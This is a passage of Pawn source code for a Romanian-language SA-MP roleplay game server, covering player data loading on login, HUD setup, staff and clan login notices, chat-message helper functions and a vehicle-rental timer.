	cache_get_value_name_int(0, "ReferralMoney", PlayerInfo[playerid][pReferralMoney]);
	cache_get_value_name_int(0, "BPoints", PlayerInfo[playerid][pBPoints]);
	cache_get_value_name_int(0, "DailyBonus", PlayerInfo[playerid][pDailyBonus]);
	cache_get_value_name_int(0, "ShowJob", PlayerInfo[playerid][pShowJob]);
	cache_get_value_name_int(0, "GiftPoints", PlayerInfo[playerid][pGiftPoints]);
	cache_get_value_name_int(0, "NewbieMute", PlayerInfo[playerid][pNewbieMute]);
	cache_get_value_name_int(0, "ReportTime", PlayerInfo[playerid][pReportTime]);
	cache_get_value_name_int(0, "WTChannel", WTChannel[playerid]);
	cache_get_value_name_int(0, "HelpedPlayers", PlayerInfo[playerid][pHelpedPlayers]);
	cache_get_value_name_int(0, "HelpedPlayersToday", PlayerInfo[playerid][pHelpedPlayersToday]);
	cache_get_value_name_int(0, "ShowFP", PlayerInfo[playerid][pShowFP]);
	cache_get_value_name_int(0, "PhoneStatus", PhoneOnline[playerid]);
	cache_get_value_name_int(0, "PhoneCalls", PhoneCalls[playerid]);
	cache_get_value_name_int(0, "ShowCeas", PlayerInfo[playerid][pShowCeas]);
	cache_get_value_name_int(0, "CaseBattle", PlayerInfo[playerid][pCaseBattle]);
	cache_get_value_name_int(0, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	cache_get_value_name_int(0, "Reborn", PlayerInfo[playerid][pReborn]);
	cache_get_value_name_bool(0, "NewbieChat", NewbieChat[playerid]);
	cache_get_value_name_int(0, "TogLC", toglc[playerid]);
	cache_get_value_name_int(0, "TogFC", gFam[playerid]);
	cache_get_value_name_int(0, "TogWT", WTToggle[playerid]);
	cache_get_value_name_int(0, "HidePM", HidePM[playerid]);
	cache_get_value_name_int(0, "TogNews", gNews[playerid]);
	cache_get_value_name_int(0, "TogLicitatie", toglicitatie[playerid]);
	cache_get_value_name_int(0, "TogClan", togclan[playerid]);
	cache_get_value_name_int(0, "TogVip", togvip[playerid]);
	cache_get_value_name_int(0, "TogBackpack", togBackpack[playerid]);
	cache_get_value_name_bool(0, "TogLegend", togLegend[playerid]);
	cache_get_value_name_int(0, "TogTransfer", togTransfer[playerid]);
	cache_get_value_name_int(0, "TogJobGoal", togJobGoal[playerid]);
	cache_get_value_name_int(0, "TogFriend", togFriend[playerid]);
	cache_get_value_name_int(0, "TogPremium", togpremium[playerid]);
	cache_get_value_name_int(0, "TogEvent", togevent[playerid]);
	cache_get_value_name_int(0, "TogDing", togding[playerid]);
	cache_get_value_name_int(0, "TogSurf", togsurf[playerid]);
	cache_get_value_name_int(0, "TogHeadText", togHeadText[playerid]);
	cache_get_value_name_int(0, "TogCrate", togCrate[playerid]);
	cache_get_value_name_int(0, "TogRaport", tograport[playerid]);
	cache_get_value_name_int(0, "TogJob", togjob[playerid]);
	cache_get_value_name_int(0, "TogRainBow", tograinbow[playerid]);
	cache_get_value_name_int(0, "TogFind", togfind[playerid]);
	cache_get_value_name_int(0, "Clan", PlayerInfo[playerid][pClan]);
	cache_get_value_name_int(0, "Tag", PlayerInfo[playerid][pTag]);
	cache_get_value_name_int(0, "ClanRank", PlayerInfo[playerid][pClanRank]);
	cache_get_value_name_int(0, "ClanWarns", PlayerInfo[playerid][pClanWarn]);
	cache_get_value_name_int(0, "ClanDays", PlayerInfo[playerid][pClanDays]);   
	cache_get_value_name_int(0, "restriction", PlayerInfo[playerid][pRestriction]);
	cache_get_value_name(0, "ChatColor", PlayerInfo[playerid][pChatColor]);    			                  	
	togLancher[playerid] = togStage[playerid] = true;

	cache_get_value_name(0, "Crates", gQuery), 				sscanf(gQuery, "a<i>[10]", PlayerInfo[playerid][pCrates]);
	cache_get_value_name(0, "Tickets", gQuery), 			sscanf(gQuery, "a<i>[9]", PlayerInfo[playerid][pTickets]);
	cache_get_value_name(0, "NeonTickets", gQuery), 		sscanf(gQuery, "a<i>[5]", PlayerInfo[playerid][pNeonTickets]);
    cache_get_value_name(0, "Voucher", gQuery), 			sscanf(gQuery, "a<i>[5]", PlayerInfo[playerid][pVoucher]);
	cache_get_value_name(0, "Skin", gQuery), 				sscanf(gQuery, "a<i>[30]", PlayerInfo[playerid][pSkins]);
    cache_get_value_name(0, "stats_info", gQuery), 			sscanf(gQuery, "a<i>[5]", PlayerInfo[playerid][pStatsInfo]);
    cache_get_value_name(0, "hats", gQuery), 				sscanf(gQuery, "a<i>[13]", PlayerInfo[playerid][pHats]);
    cache_get_value_name(0, "lasers", gQuery), 				sscanf(gQuery, "a<i>[6]", PlayerInfo[playerid][pLasers]);
   	cache_get_value_name(0, "shards", gQuery), 				sscanf(gQuery, "a<i>[3]", PlayerInfo[playerid][pShard]);
    cache_get_value_name(0, "Guns", gQuery), 				sscanf(gQuery, "a<i>[4]", PlayerInfo[playerid][pGuns]);
    cache_get_value_name(0, "hunger", gQuery), 				sscanf(gQuery, "a<i>[5]", PlayerInfo[playerid][pHunger]);
   	cache_get_value_name(0, "Raport", gQuery),				sscanf(gQuery, "a<i>[3]", PlayerInfo[playerid][pCommands]);
    cache_get_value_name(0, "job_skills", gQuery), 			sscanf(gQuery, "a<i>[17]", PlayerInfo[playerid][pJobSkill]);
    cache_get_value_name(0, "job_skills_points", gQuery), 	sscanf(gQuery, "a<i>[17]", PlayerInfo[playerid][pJobSkillPoints]);
    cache_get_value_name(0, "emotes", gQuery), 				sscanf(gQuery, "a<i>[11]", PlayerInfo[playerid][pEmotes]);
	cache_get_value_name(0, "AchievementStatus", gQuery), 	sscanf(gQuery, "a<i>[35]", PlayerInfo[playerid][pAchievementStatus]);
	cache_get_value_name(0, "special_pet", gQuery),			sscanf(gQuery, "a<i>[6]", PlayerInfo[playerid][pSpecialPet]);
	cache_get_value_name(0, "ClanAccess", gQuery),			sscanf(gQuery, "a<i>[3]", PlayerInfo[playerid][pClanAccess]);
	cache_get_value_name(0, "LottoNumbers", gQuery),		sscanf(gQuery, "a<i>[6]", PlayerInfo[playerid][pLotto]);
	cache_get_value_name(0, "Accessories", gQuery),			sscanf(gQuery, "a<i>[22]", PlayerInfo[playerid][pAccessories]);
	cache_get_value_name(0, "AccessoriesOn", gQuery),		sscanf(gQuery, "a<i>[22]", PlayerInfo[playerid][pAccessoriesOn]);

	cache_get_value_name_int(0, "SpawnChange", SpawnChange[playerid]);
	cache_get_value_name_float(0, "Seconds", PlayerInfo[playerid][pSeconds]);
	cache_get_value_name_int(0, "CarLicS", PlayerInfo[playerid][pCarLicS]);
	cache_get_value_name_int(0, "BoatLicS", PlayerInfo[playerid][pBoatLicS]);
	cache_get_value_name_int(0, "FlyLicS", PlayerInfo[playerid][pFlyLicS]);
	cache_get_value_name_int(0, "GunLicS", PlayerInfo[playerid][pGunLicS]);
	cache_get_value_name_int(0, "ShowDMG", PlayerInfo[playerid][pShowDMG]);
	cache_get_value_name_int(0, "Slot", PlayerInfo[playerid][pSlot]);
	cache_get_value_name_int(0, "DailyMission1", PlayerInfo[playerid][pDailyMission][0]);
	cache_get_value_name_int(0, "DailyMission2", PlayerInfo[playerid][pDailyMission][1]);
	cache_get_value_name_int(0, "DailyMission3", PlayerInfo[playerid][pDailyMission][2]);
	cache_get_value_name_int(0, "DailyMission4", PlayerInfo[playerid][pDailyMission][3]);
	cache_get_value_name_int(0, "DailyMission5", PlayerInfo[playerid][pDailyMission][4]);
	cache_get_value_name_int(0, "NeedProgress1", PlayerInfo[playerid][pNeedProgress][0]);
	cache_get_value_name_int(0, "NeedProgress2", PlayerInfo[playerid][pNeedProgress][1]);
	cache_get_value_name_int(0, "NeedProgress3", PlayerInfo[playerid][pNeedProgress][2]);
	cache_get_value_name_int(0, "NeedProgress4", PlayerInfo[playerid][pNeedProgress][3]);
	cache_get_value_name_int(0, "NeedProgress5", PlayerInfo[playerid][pNeedProgress][4]);
	cache_get_value_name_int(0, "Progress1", PlayerInfo[playerid][pProgress][0]);
	cache_get_value_name_int(0, "Progress2", PlayerInfo[playerid][pProgress][1]);
	cache_get_value_name_int(0, "Progress3", PlayerInfo[playerid][pProgress][2]);
	cache_get_value_name_int(0, "Progress4", PlayerInfo[playerid][pProgress][3]);
	cache_get_value_name_int(0, "Progress5", PlayerInfo[playerid][pProgress][4]);
	cache_get_value_name_int(0, "GasCan", PlayerInfo[playerid][pGasCan]);
	cache_get_value_name_int(0, "Glasses", PlayerInfo[playerid][pGlasses]);
	cache_get_value_name_int(0, "ShowGlasses", PlayerInfo[playerid][pShowGlasses]);
	cache_get_value_name_int(0, "ShowHP", PlayerInfo[playerid][pShowHP]);
	cache_get_value_name_int(0, "ShowAP", PlayerInfo[playerid][pShowAP]);
	cache_get_value_name_int(0, "Pin", PlayerInfo[playerid][pPin]);
	cache_get_value_name_int(0, "Color", PlayerInfo[playerid][pColor]);
	cache_get_value_name_int(0, "Days", PlayerInfo[playerid][pDays]);
	cache_get_value_name_int(0, "EscapePoints", PlayerInfo[playerid][pEscapePoints]);
	cache_get_value_name_int(0, "Hat", PlayerInfo[playerid][pHat]);
	cache_get_value_name_int(0, "ShowHat", PlayerInfo[playerid][pShowHat]);
	cache_get_value_name_int(0, "DailyLogin", PlayerInfo[playerid][pDailyLogin]);
	cache_get_value_name_int(0, "AJail", PlayerInfo[playerid][pAJail]);
	cache_get_value_name_int(0, "HW", PlayerInfo[playerid][pHW]);
	cache_get_value_name_int(0, "AW", PlayerInfo[playerid][pAW]);
	cache_get_value_name_int(0, "LW", PlayerInfo[playerid][pLW]);
	cache_get_value_name_int(0, "ExpHW", PlayerInfo[playerid][pExpHW]);
	cache_get_value_name_int(0, "ExpAW", PlayerInfo[playerid][pExpAW]);
	cache_get_value_name_int(0, "ExpLW", PlayerInfo[playerid][pExpLW]);
	cache_get_value_name_int(0, "WarKills", WarKills[playerid]);
	cache_get_value_name_int(0, "WarDeaths", WarDeaths[playerid]);
	cache_get_value_name_int(0, "ExpFW", PlayerInfo[playerid][pExpFW]);
	cache_get_value_name_int(0, "ActivePaydays", PlayerInfo[playerid][pActivePaydays]);

	if(PlayerInfo[playerid][pExpLW] < gettime() && PlayerInfo[playerid][pLW]) {
		SendClientMessage(playerid, COLOR_LGREEN, "Leader Warn has expired");
		PlayerInfo[playerid][pLW]=0;
		UpdateVar(playerid, "LW", 0);
	}

	if(PlayerInfo[playerid][pExpAW] < gettime() && PlayerInfo[playerid][pAW]) {
		SendClientMessage(playerid, COLOR_LGREEN, "Admin Warn has expired");
		PlayerInfo[playerid][pAW]=0;
		UpdateVar(playerid, "AW", 0);
	}
	if(PlayerInfo[playerid][pExpHW] < gettime() && PlayerInfo[playerid][pHW]) {
		SendClientMessage(playerid, COLOR_LGREEN, "Helper Warn has expired");
		PlayerInfo[playerid][pHW]=0;
		UpdateVar(playerid, "HW", 0);
	}

	if(PlayerInfo[playerid][pExpFW] < gettime() && PlayerInfo[playerid][pFACWarns]) {
		SendClientMessage(playerid, COLOR_LGREEN, "Helper Warn has expired");
		PlayerInfo[playerid][pFACWarns]=0;
		UpdateVar(playerid, "FWarn", 0);
	}
	
	SpawnPlayer(playerid);
	create_head_label(playerid);
	if HavePhone(playerid) *then {
		SendClientMessage(playerid, -1, "Ai telefon");
		SetGVarInt(PlayerInfo[playerid][pPhone],playerid+1); 
	}

	cache_get_value_name_bigint(money[playerid], 0, "Money");
	cache_get_value_name_bigint(bank[playerid], 0, "Bank");

	if(PlayerInfo[playerid][pWantedLevel]) 	Iter_Add(servicePlayers<8>, playerid);
	if(PlayerInfo[playerid][pClan]) 		Iter_Add(clan_players<PlayerInfo[playerid][pClan]>, playerid);
	if(PlayerInfo[playerid][pWTalkie]) 		Iter_Add(freq_members<WTChannel[playerid]>, playerid);

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `cars` WHERE `Userid`='%i' LIMIT %i", PlayerInfo[playerid][pSQLID], MAX_PLAYER_VEHICLE);
	mysql_tquery(SQL, gQuery, "LoadPlayerCars", #i, playerid);

	RemoveMaps(playerid);
	PlayerTextdraws(playerid);
	new clanid;
	if((clanid = PlayerInfo[playerid][pClan])) {
		if(strlen(PlayerInfo[playerid][pUsername])+strlen(ClanInfo[clanid][clTag]) < MAX_PLAYER_NAME) {
			switch(PlayerInfo[playerid][pTag]) {
				case -1: format(gString, 60, "%s", PlayerInfo[playerid][pUsername]), SetPlayerName(playerid, gString);
				case 0: format(gString, 60, "%s%s", ClanInfo[clanid][clTag], PlayerInfo[playerid][pUsername]), SetPlayerName(playerid, gString);
				case 1: format(gString, 60, "%s%s", PlayerInfo[playerid][pUsername], ClanInfo[clanid][clTag]), SetPlayerName(playerid, gString);
			}
		}
	}
	if(PlayerInfo[playerid][pShowCeas] != 0) PlayerTextDrawShow(playerid, CeasPTD), TextDrawShowForPlayer(playerid, CeasTD);
	switch(PlayerInfo[playerid][pFightStyle]) {
		case 0: SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
		case 1: SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
		case 2: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
		case 3: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
		case 4: SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
		case 5: SetPlayerFightingStyle(playerid, FIGHT_STYLE_ELBOW);
	}
	_query("UPDATE `users` SET `Status` = '%i', `IP`='%s' WHERE `ID`='%d'", playerid, GetIPP(playerid), PlayerInfo[playerid][pSQLID]);
	Iter_Add(logged_players, playerid);
	new y,m,d,h,mi,s; getdate(y,m,d); gettime(h,mi,s);
	format(gString, sizeof gString, "%d/%d/%d %02d:%02d:%02d", d,m,y,h,mi,s);
	_query("INSERT INTO `iplogs` (`ip`, `playerid`, `time`) VALUES ('%s', '%i', '%s')", GetIPP(playerid), PlayerInfo[playerid][pSQLID], gString);
	GameTextForPlayer(playerid, " ", 3000,3);
	Iter_Add(StreamedPlayer[playerid], playerid);
	StopAudioStreamForPlayer(playerid);
	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	for(new j = 0; j <= 30; j++) SendClientMessage(playerid, COLOR_WHITE, "");
	if PlayerInfo[playerid][pAdmin] *then {
		format(gString, 128, "HelloBot: Admin %s has just logged in.", GetName(playerid));
		SendAdminMessage(COLOR_LOGS, gString, 1);
		Iter_Add(Staff<ADMIN>, playerid);
		Iter_Add(faction_leaders, playerid);
		if(Iter_Count(report_players)) TextDrawShowForPlayer(playerid, ReportTD);
	}
	else if PlayerInfo[playerid][pHelper] *then {
		Iter_Add(Staff<HELPER>, playerid);
		format(gString, 128, "HelloBot: Helper %s has just logged in.", GetName(playerid));
		SendAdminMessage(COLOR_LOGS, gString, 1);
		Iter_Add(Staff<ADMIN>, playerid);
	}
	if PlayerInfo[playerid][pVip] == 3 *then Iter_Add(PlayerVips<LEGEND>, playerid);
	else if PlayerInfo[playerid][pVip] *then Iter_Add(PlayerVips<NORMAL>, playerid);
	if(PlayerInfo[playerid][pPremiumAccount] != 0 || PlayerInfo[playerid][pAdmin] != 0) Iter_Add(PlayerPremiums, playerid);	
	for(new x=0;x<sizeof rob_camera_pos;x++) {
		camera_obj[playerid][x][0] = CreateDynamicObject(1616, rob_camera_pos[x][0], rob_camera_pos[x][1], rob_camera_pos[x][2], 0.0, 0.0, rob_camera_pos[x][3], -1, -1, playerid);
		camera_obj[playerid][x][1] = CreateDynamicObject(1616, rob_camera_pos[x][4], rob_camera_pos[x][5], rob_camera_pos[x][6], 0.0, 0.0, rob_camera_pos[x][7], -1, -1, playerid);
	}
	if(PlayerInfo[playerid][pShowFP]) PlayerTextDrawShow(playerid, ShowFPS);
	if(PlayerInfo[playerid][pYouTuber]) Iter_Add(youtubers, playerid);
	if(PlayerInfo[playerid][pDailyMission][0] == -1) GiveQuest(playerid);
	if(PlayerInfo[playerid][pRank] == 5) finishAchievement(playerid, 17);
	if(PlayerInfo[playerid][pHouse]!=999) finishAchievement(playerid, 15);
	if(PlayerInfo[playerid][pDays]>=100) finishAchievement(playerid, 31);
	if(PlayerInfo[playerid][pTester]) finishAchievement(playerid, 33);
	TogglePlayerControllable(playerid, true);
	SetCameraBehindPlayer(playerid);
	if(PlayerInfo[playerid][pShowProgress][0]) HudProgress[playerid][0] = CreatePlayerProgressBar(playerid, 513.00, 150.00, 85.50, 2.50, 0x00FF00FF, 100.0), UpdateProgress(playerid, 0);
	if(PlayerInfo[playerid][pShowProgress][1]) HudProgress[playerid][1] = CreatePlayerProgressBar(playerid, 513.00, 175.00, 85.50, 2.50, 0x00FF00FF, 100.0), UpdateProgress(playerid, 1);

	TextDrawShowForPlayer(playerid, DataT[0]);
	TextDrawShowForPlayer(playerid, DataT[1]);
	TextDrawShowForPlayer(playerid, DataT[2]);

	if(PlayerInfo[playerid][pDailyActivity] <= 1) {
		TextDrawSetString(CollectTD[0], "Daily Activity~n~Reward~n~~y~(/collect)");
		SendClientMessage(playerid, 0xc3ff00FF, "Daily Activity: {FFFFFF}Foloseste comanda (/collect) pentru a colecta bonusul zilnic pentru activitate!");
	}

	
	SCMf(playerid, COLOR_WHITE, "Welcome back, %s!", GetName(playerid));
	for(new i=0,j=sizeof g_Tree;i<j;i++) TreeObj[playerid][i] = CreateDynamicObject(660, g_Tree[i][0], g_Tree[i][1], g_Tree[i][2],   0.00000, 0.00000, 0.00000, 0, 0, playerid, 300.00);
	for(new i=0,j=sizeof stone_object;i!=j;i++) _stoneObj[playerid][i] = CreateDynamicObject(3931, stone_object[i][0], stone_object[i][1], stone_object[i][2], 0.0,0.0,0.0, -1, -1, playerid, 300.0);
	GivePlayerMoney(playerid, GetPlayerCash(playerid)); 
	if(PlayerInfo[playerid][pShowProgress][2] == 1) for(new i = 0; i < 2; i++) TextDrawShowForPlayer(playerid, GoalTD[i]);
	if(PlayerInfo[playerid][pShowProgress][3] == 1) for(new i = 0; i < 2; i++) TextDrawShowForPlayer(playerid, GiftTD[i]);
	if(PlayerInfo[playerid][pShowProgress][4] == 1) for(new i = 0; i < 3; i++) TextDrawShowForPlayer(playerid, CollectTD[i]);
	vipLabel[playerid] = Create3DTextLabel("", -1, 0.0, 0.0, 0.0, 10.0, 0, 0);
	deathLabel[playerid] = Create3DTextLabel("", -1, 0.0, 0.0, 0.0, 10.0, 0, 0);
	if(PlayerInfo[playerid][pWantedLevel] > 0) {
		SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
		SCMf(playerid, COLOR_LIGHTRED, "Aveai wanted %d inainte sa iesi de pe server.",PlayerInfo[playerid][pWantedLevel]);
	}
	if(PlayerInfo[playerid][pMember] != 0) {
		Iter_Add(faction_players<PlayerInfo[playerid][pMember]>, playerid);
	    SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, "(Group) {FFFFFF}%s from your group has just logged in.",GetName(playerid));
		sendSplittedMessageToPlayer(playerid, COLOR_CLIENT, COLOR_CLIENT, "(Group MOTD) {FFFFFF}%s",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	    if(PlayerInfo[playerid][pRank]>=7) Iter_Add(faction_leaders, playerid);
	}
	if(clanid != 0) {
		format(gString, 128, "{A9C4E4}(Clan) {FFFFFF}%s from your clan has just logged in.", GetName(playerid));
		SendClanMessage(PlayerInfo[playerid][pClan], gString);
		sendSplittedMessageToPlayer(playerid, COLOR_CLIENT, COLOR_CLIENT, "(Clan MOTD) {FFFFFF}%s.", ClanInfo[PlayerInfo[playerid][pClan]][clMotd]);
	}
	Pet[playerid] = (INVALID_PET);
	if(PlayerInfo[playerid][pPetStatus]) {
		format(gString, 80, "{56FC03}Pet Lvl. {FFF700}%d\n{fff700}%s",PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPetName]);
		Pet[playerid] = CreateDynamic3DTextLabel(gString, COLOR_WHITE, 357.120239, 1.712298, 349.232513, 5, playerid);
	}
   	PreloadAnimLib(playerid,"BOMBER"), PreloadAnimLib(playerid,"RAPPING"), PreloadAnimLib(playerid,"SHOP"), PreloadAnimLib(playerid,"BEACH");
	PreloadAnimLib(playerid,"SMOKING"), PreloadAnimLib(playerid,"FOOD"), PreloadAnimLib(playerid,"ON_LOOKERS"), PreloadAnimLib(playerid,"DEALER");
	PreloadAnimLib(playerid,"MISC"), PreloadAnimLib(playerid,"SWEET"), PreloadAnimLib(playerid,"RIOT"), PreloadAnimLib(playerid,"PED");
	PreloadAnimLib(playerid,"POLICE"), PreloadAnimLib(playerid,"CRACK"), PreloadAnimLib(playerid,"CARRY"), PreloadAnimLib(playerid,"COP_AMBIENT");
	PreloadAnimLib(playerid,"PARK"), PreloadAnimLib(playerid,"INT_HOUSE"), PreloadAnimLib(playerid,"FOOD"), PreloadAnimLib(playerid,"SPRAYCAN");
	if(PlayerInfo[playerid][pPin] != 0) {
		IsPin[playerid] = 2;
		SendClientMessage(playerid, COLOR_CLIENT, "(PIN): {FFFFFF}Pentru a avea acces la cont trebuie sa introduci contul tau pin!");
		for(new i = 0; i < 8; i++) TextDrawShowForPlayer(playerid, PinTD[i]);
		for(new i = 0; i < 11; i++) PlayerTextDrawShow(playerid, PinPTD[i]);
		player_selected[playerid] = 1;
		SelectTextDraw(playerid, 0xFF5B5BFF);
	} else SendClientMessage(playerid, COLOR_CLIENT, "(PIN): {FFFFFF}Nu ai un PIN setat pentru contul tau, daca doresti sa-ti setezi unul pentru o securitate mai buna, foloseste (/addpin).");
	if(PlayerInfo[playerid][pTutorial] < 5) {
		for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
		if(PlayerInfo[playerid][pTutorial]>=1) SendClientMessage(playerid, COLOR_YELLOW, "Nu ai terminat tutorialul!");
		Tutorial(playerid);
		return true;
	}
	ServerOnlinePlayers++;

	//lotto
	format(gString, sizeof gString, "\
	{6fc400}Lotto System (6/49, /playlotto)\n\n\
	{FFFFFF}Pretul unui bilet este de {6fc400}$10.000.000{FFFFFF}.\n\
	Extragerile au loc marti, joi, sambata si duminica la ora 20:30.\n\
	Jackpot: {6fc400}$%s{FFFFFF} (%d bets)", FormatNumber(sql_lotto_bets*5000000), sql_lotto_bets);
	lotto_label[playerid] = CreateDynamic3DTextLabel(gString, -1, 2156.4937,1599.4507,1006.1797, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1);

	//server bonus
	switch(Iter_Count(logged_players)) {
		case 700: {
			if(server_bonus>=1) return true;
			foreach(new i : logged_players) GivePlayerCash(i, 5000000);
			sendSplittedMessage(COLOR_YELLOW, "Deoarece serverul a atins suma de 900 de jucatori simultan, fiecare jucator a fost recompensat cu $5,000,000.");
			server_bonus = 1;
		}
		case 800: {
			if(server_bonus>=2) return true;
			foreach(new i : logged_players) PlayerInfo[i][pExp] += 10;
			sendSplittedMessage(COLOR_YELLOW, "Deoarece serverul a atins suma de 900 de jucatori simultan, fiecare jucator a fost recompensat cu 10 respect points.");
			server_bonus = 2;
		}
		case 900: {
			if(server_bonus>=3) return true;
			foreach(new i : logged_players) PlayerInfo[i][pBPoints] += 250;
			sendSplittedMessage(COLOR_YELLOW, "Deoarece serverul a atins suma de 900 de jucatori simultan, fiecare jucator a fost recompensat cu 250 bPoints.");
			server_bonus = 3;
		}
		case 1000: {
			if(server_bonus>=4) return true;
			sendSplittedMessage(COLOR_YELLOW, "Deoarece serverul a atins suma de 1000 de jucatori simultan, fiecare jucator a fost recompensat cu o suma de premium points.");
			foreach(new i : logged_players) {
				new suma = RandomEx(1, 10);
				PlayerInfo[i][pPremiumPoints] += suma;
				va_SendClientMessage(i, COLOR_YELLOW, "Ai fost recompensat cu suma de %d premium points.", suma);
			}
			server_bonus = 4;
		}
	}

	format(gString, sizeof gString, "%s(%d) s-a logat pe server. [money: $%s | bank: $%s | pp: %d | bp: %d]", GetName(playerid), playerid, formatBytes(money[playerid]), formatBytes(bank[playerid]), PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pBPoints]);
	InsertLog(playerid, gString, LOG_MONEY);
	return true;
}

stock SendErrorMsg(playerid, const error[], {Float, _}:...)
{
	if(!IsPlayerConnected(playerid))
		return 0;

	static out[256];
	va_format(out, sizeof out, error, ___(2));
	strins(out, ""C_LIGHTGREY"Eroare: {f9f9f9}", 0);

	return sendSplittedMessageToPlayer(playerid, -1, -1, out);
}

stock SendUsageMsg(playerid, const message[], {Float, _}:...)
{
	if(!IsPlayerConnected(playerid))
		return 0;

	static out[256];
	va_format(out, sizeof out, message, ___(2));
	strins(out, ""C_TEAL"Syntax: {f9f9f9}/", 0);

	return sendSplittedMessageToPlayer(playerid, -1, -1, out);
}

stock SendPaintMessage(paintid, color, const text[], va_args<>) 
{
    static out[168];
	va_format(out, sizeof out, text, va_start<3>);

    foreach(new i : InPaint<paintid-1>) SendClientMessage(i, color, out);
	return true;
}

stock NearMessage(playerid, color, const string[], va_args<>) 
{
    static out[168]; new Float: Coordss[3];

	va_format(out, sizeof out, string, va_start<3>);
	GetPlayerPos(playerid, Coordss[0], Coordss[1], Coordss[2]);

	foreach(new i : StreamedPlayer[playerid]) if(!IsPlayerInRangeOfPoint(i, 25.0, Coordss[0], Coordss[1], Coordss[2]) || GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) SendClientMessage(i, color, out);
	return true;
}

stock LeaderChat(color, const string[], va_args<>) 
{
    static out[168];
	va_format(out, sizeof out, string, va_start<3>);

    foreach(new i : faction_leaders) if(!toglc[i]) SendClientMessage(i, color, out);
	return true; 
}

stock SendNewbieMessage(color, const string[], va_args<>) 
{
	static out[168];
	va_format(out, sizeof out, string, va_start<3>);

    foreach(new i : logged_players) if(NewbieChat[i]) SendClientMessage(i, color, out);
	return true;
}

stock OOCNews(color, const string[], va_args<>)
{
	static out[168];
	va_format(out, sizeof out, string, va_start<3>);

	foreach(new i : logged_players) if(!gNews[i]) SendClientMessage(i, color, out);
	return true;
}

stock SendRadioMessage(member, color, const text[], va_args<>) 
{
	static out[168];
	va_format(out, sizeof out, text, va_start<3>);

    foreach(new i : faction_players<member>) SendClientMessage(i, color, out);
	return true;
}

stock SendClanMessage(clanid, const text[], va_args<>) 
{
	static out[168];
	va_format(out, sizeof out, text, va_start<3>);

	foreach(new i : clan_players<clanid>) SendClientMessage(i, -1, out);
	return true;
}

stock SendFactionMessage(family, color, const string[], va_args<>)
{
	static out[168]; 
	va_format(out, sizeof out, string, va_start<3>);

	foreach(new i : faction_players<family>) sendSplittedMessageToPlayer(i, color, color, out);
	return true;
}

stock SendAdminMessage(color, const string[], level, va_args<>)
{
	static out[168];
	va_format(out, sizeof out, string, va_start<3>);

    foreach(new i: Staff<ADMIN>) if(PlayerInfo[i][pAdmin] >= level && togAdmin[i]) SendClientMessage(i, color, out);
	return true;
}

stock SendStaffMessage(color, const str[], va_args<>) 
{
	static out[168];
	va_format(out, sizeof out, str, va_start<3>);

	foreach(new i: All(Staff<>)) if(togHelper[i]) SendClientMessage(i, color, out);
	return true;
}

stock sendSplittedMessageToPlayer(const playerid, const first_line_color, const last_line_color, const message[], va_args<>) {
    new  string[289];
    va_format(string, sizeof string, message, va_start<4>);

    va_SendClientMessage(playerid, first_line_color, string);

    if(strlen(string) >= 144)  va_SendClientMessage(playerid, last_line_color, "... %s", string[143]);
    return true;
}

stock sendSplittedMessage(const color, const message[], va_args<>) {
    new  string[289];
    va_format(string, sizeof string, message, va_start<4>);

    va_SendClientMessageToAll(color, string);

    if(strlen(string) >= 144) va_SendClientMessageToAll(color, "... %s", string[143]);
    return 1;
}



stock SendTeamMessage(member, color, const string[], va_args<>) {
	static out[168];
	va_format(out, sizeof out, string, va_start<3>);

	switch(member) {
		case 1,2,3,14,19: {
			foreach(new i : faction_players<1>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<2>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<3>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<14>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<19>) SendClientMessage(i, color, out);
		}
		case 7,16,21: {
			foreach(new i : faction_players<7>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<16>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<21>) SendClientMessage(i, color, out);
		}
		case 12,15,23: {
			foreach(new i : faction_players<12>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<15>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<23>) SendClientMessage(i, color, out);
		}
		case 8,22: {
			foreach(new i : faction_players<8>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<22>) SendClientMessage(i, color, out);
		}
		case 13,20: {
			foreach(new i : faction_players<13>) SendClientMessage(i, color, out);
			foreach(new i : faction_players<20>) SendClientMessage(i, color, out);
		}
		default: foreach(new i : faction_players<member>) SendClientMessage(i, color, out);
	}
	return true;
}

PreloadAnimLib(playerid, const animlib[]) ApplyAnimation(playerid,animlib,"Null",0.0,0,0,0,0,0);

stock ChatLog(userid, const text[], va_args<>) 
{
	static out[168];
	va_format(out, sizeof out, text, va_start<3>);
	return InsertLog(userid, out, LOG_CHAT);
}

task RentCar[20000]() {
	new idd,vid;
	foreach(new i : logged_players) {
		if(GetPlayerState(i) != PLAYER_STATE_DRIVER || (vid=GetPlayerVehicleID(i)) != VehicleRent[i]) continue;
		idd=BizzTypeID[IsABike2(vid)?10:11][0];
		if(GetPlayerCash(i) < BizzInfo[idd][bFee]) {
			RemovePlayerFromVehicleEx(i);
			PlayerTextDrawHide(i, FareTD);
			SendClientMessage(i, COLOR_GREY, "Ai fost dat afara din vehicul deoarece nu ai banii necesari!");
			continue;
		}
		BizzInfo[idd][bBalance] += BizzInfo[idd][bFee];
		GivePlayerCash(i, -150);
	}
	return true;
}
redist::SetWorldTimeEx(hour) {
	SetWorldTime(hour);	
	SetWeather(0);
	return true;
}
